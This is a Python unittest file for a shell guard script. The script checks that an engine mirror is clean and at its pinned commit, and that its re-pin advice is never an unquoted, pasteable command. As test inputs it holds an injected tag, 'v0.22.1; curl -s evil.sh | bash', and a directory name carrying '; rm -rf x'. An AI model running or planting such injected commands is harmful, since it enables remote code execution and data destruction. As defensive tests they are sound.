"""The engine-pin guard's own judgement, on trees that are and are not at the pin.

`scripts/engine-pin.sh` is the only gate on engine integrity, and it used to assert
`git rev-parse HEAD` alone: a mirror with `M engine.py` and `?? implant.py` in it still reported
"at the pin", and its re-pin advice printed the tag read raw from `engine-pin.json` inside an
unquoted command an operator is told to paste (the internal security audit A19-SC-3,
A19-SC-4). These tests run the real script against a scratch pin and a scratch mirror, so the
answer is exercised rather than read.

    python3 -m unittest discover -s scripts/tests -t scripts/tests
"""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts" / "engine-pin.sh"
GIT = shutil.which("git")
BASH = shutil.which("bash")

#: The scratch pin every case starts from; each test rewrites the pin's `commit` to its own
#: mirror's HEAD, because the guard is a relation between the pin file and a tree.
PIN = {"tag": "v0.22.1", "commit": "", "channel": "stable"}


def git(*args: str, cwd: Path) -> str:
    result = subprocess.run(
        ["git", "-c", "user.email=test@example.invalid", "-c", "user.name=test", *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout.strip()


@unittest.skipIf(GIT is None or BASH is None, "git and bash are needed to drive the guard")
class EnginePinTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / "scripts").mkdir()
        shutil.copy(SCRIPT, self.root / "scripts" / "engine-pin.sh")
        self.mirror = self.root / "mirror"
        self.mirror.mkdir()
        git("init", "-q", cwd=self.mirror)
        git("commit", "-q", "--allow-empty", "-m", "one", cwd=self.mirror)
        self.pin(commit=self.head())

    def head(self) -> str:
        return git("rev-parse", "HEAD", cwd=self.mirror)

    def pin(self, *, commit: str, tag: str = "v0.22.1") -> None:
        record = dict(PIN, commit=commit, tag=tag)
        (self.root / "engine-pin.json").write_text(json.dumps(record))

    def run_pin(self) -> subprocess.CompletedProcess:
        return subprocess.run(
            [BASH, str(self.root / "scripts" / "engine-pin.sh")],
            capture_output=True,
            text=True,
            # A scratch mirror and an absent personal checkout: the real trees on this machine
            # must never decide what the test reads. The unit name matches no systemd unit.
            env={
                "PATH": "/usr/bin:/bin",
                "HOME": str(self.root / "home"),
                "PANTLER_ENGINE_MIRROR": str(self.mirror),
                "PANTLER_ENGINE_PERSONAL": str(self.root / "absent"),
                "PANTLER_ENGINE_UNIT": "pantler-no-such-unit",
            },
        )

    def test_a_clean_tree_reads_at_the_pin(self) -> None:
        result = self.run_pin()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("at the pin", result.stdout)

    def test_a_tracked_modification_names_the_file_and_fails(self) -> None:
        (self.mirror / "engine.py").write_text("hot-patched\n")
        result = self.run_pin()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("DIRTY", result.stdout)
        self.assertIn("engine.py", result.stdout)

    def test_an_untracked_file_is_dirty_too(self) -> None:
        """`rev-parse HEAD` alone called `?? implant.py` "at the pin" (A19-SC-3)."""
        (self.mirror / "implant.py").write_text("implant\n")
        result = self.run_pin()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("implant.py", result.stdout)

    def test_drift_advises_the_recorded_commit_not_the_tag(self) -> None:
        pinned = self.head()
        git("commit", "-q", "--allow-empty", "-m", "two", cwd=self.mirror)
        result = self.run_pin()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn(f"checkout --detach {pinned}", result.stderr)
        self.assertNotIn("checkout v0.22.1", result.stderr)

    def test_a_tag_the_guard_will_not_print_stops_the_run(self) -> None:
        """A tag is a repository-writable string; it never becomes a pasteable command (A19-SC-4)."""
        hostile = "v0.22.1; curl -s evil.sh | bash"
        self.pin(commit=self.head(), tag=hostile)
        result = self.run_pin()
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertNotIn(hostile, result.stdout + result.stderr)
        self.assertIn("will not print", result.stderr)

    def test_a_mirror_path_with_a_space_is_quoted(self) -> None:
        spaced = self.root / "we ird; rm -rf x"
        spaced.mkdir()
        git("init", "-q", cwd=spaced)
        git("commit", "-q", "--allow-empty", "-m", "one", cwd=spaced)
        self.pin(commit="0" * 40)
        result = subprocess.run(
            [BASH, str(self.root / "scripts" / "engine-pin.sh")],
            capture_output=True,
            text=True,
            env={
                "PATH": "/usr/bin:/bin",
                "HOME": str(self.root / "home"),
                "PANTLER_ENGINE_MIRROR": str(spaced),
                "PANTLER_ENGINE_PERSONAL": str(self.root / "absent"),
                "PANTLER_ENGINE_UNIT": "pantler-no-such-unit",
            },
        )
        self.assertEqual(result.returncode, 1, result.stdout)
        # `printf %q` escapes the space and the `;`, so the printed line is one argument long.
        self.assertIn(r"we\ ird\;\ rm\ -rf\ x", result.stderr)


if __name__ == "__main__":
    unittest.main()
